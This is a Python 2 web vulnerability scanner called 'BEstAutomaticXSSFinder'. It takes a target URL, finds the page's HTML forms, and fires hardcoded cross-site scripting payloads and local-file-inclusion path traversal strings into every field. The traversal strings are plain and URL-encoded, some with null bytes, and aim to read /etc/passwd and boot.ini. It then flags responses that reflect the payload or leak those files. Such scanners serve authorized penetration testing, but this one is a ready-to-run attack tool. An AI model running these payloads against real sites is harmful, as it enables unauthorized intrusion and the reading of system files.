#! python
###############################################
#   BEstAutomaticXSSFinder                    #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0
xss_attacks = [ "<script>alert(1);</script>", "<img src=x onerror=prompt(/test/)>",
                "\"><script>alert(1);</script><div id=\"x", "</script><script>alert(1);</script>",
                "</title><script>alert(1);</script>", "<body background=\"javascript:alert(1)\">",
                "<img src=test123456.jpg onerror=alert(1)>"]

lfi_attacks = [
                #linux
                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
                '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',

                #windows
                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
                '../../../../../boot.ini', '../../../../../../boot.ini',
                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
                ]

lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']

def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global xss_attacks
    global DEBUG
    if page.find("http://") == 0 or page.find("https://") == 0:
        furl = page
    else:
        if _url.find("https://") == 0:
            furl = "https://" + host + "/" + page
        else:
            furl = "http://" + host + "/" + page

    print "[+] XSS check for: " + furl
    if DEBUG == 1:
        print "Params: "
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for xss in xss_attacks:
        post_params={}
        counter+=1
        parameters = ""
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = xss
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find("get") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open("response_" + str(form_counter) + "_" + str(counter) + ".html", "w") as f:
                f.write(r.content)

        if r.content.find(xss)>=0:
            print "[+] Target is VULNERABLE"
            print "Url: " + url
            print "Parameters: %s\n" % str(post_params)

            #comment out the return if you want all the findings
            return
    return

def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global lfi_attacks
    global lfi_expect
    global DEBUG
    if page.find("http://") == 0 or page.find("https://") == 0:
        furl = page
    else:
        if _url.find("https://") == 0:
            furl = "https://" + host + "/" + page
        else:
            furl = "http://" + host + "/" + page

    print "[+] LFI check for: " + furl
    if DEBUG == 1:
        print "Params: "
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for lfi in lfi_attacks:
        post_params={}
        counter+=1
        parameters = ""
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = lfi
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find("get") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open("response_" + str(form_counter) + "_" + str(counter) + ".html", "w") as f:
                f.write(r.content)

        for lfi_result in lfi_expect:
            if r.content.find(lfi_result)>=0:
                print "[+] Target is VULNERABLE"
                print "Url: " + url
                print "Parameters: %s\n" % str(post_params)

                #comment out the return if you want all the findings
                return
    return


def scan_for_forms(fname, host, url):
    print "[+] Start scan"
    rtype=""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = ""
    form_counter = 0
    try:
        with open(fname, "r") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find("</form>") >=0:
                    has_form=0
                    if len(page) > 0 and len(params) > 0:
                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name="(\w+)"', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value="(\w+)"', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>"', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action="([\w\/\.\-\#\:]+)"', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method="([\w\/\.\-]+)"', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""
                    else:
                        page=m_action.group(1)
                    rtype="get"
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print "[+] Form detected. Method " + rtype.upper()

    except Exception, e:
        print "[-] scan_for_forms(): Error " + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def banner():
    print "BEstAutomaticXSSFinder v1.0"
    print "DISCLAIMER: For testing purposes only!\n"

###MAIN###
if __name__ == "__main__":
    banner()

    if len(sys.argv) != 2:
        print "program [url]"
        exit()

    url = sys.argv[1]
    if url.find("http") != 0:
        print "[-] Invalid target"
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print "[-] Can't get host information"
        exit()

    print "[+] Host acquired " + host
    print "[+] Retrieve page"
    try:
        r = requests.get(url)
        s = r.content.replace(">", ">\n")

        #good to have a local copy for testing
        with open("tmpage.txt", "w") as f:
            f.write(s)

        scan_for_forms("tmpage.txt", host, url)
        os.remove("tmpage.txt")
    except Exception, e:
        print "[-] Main(): Error " + str(e)

print "[*] Done"
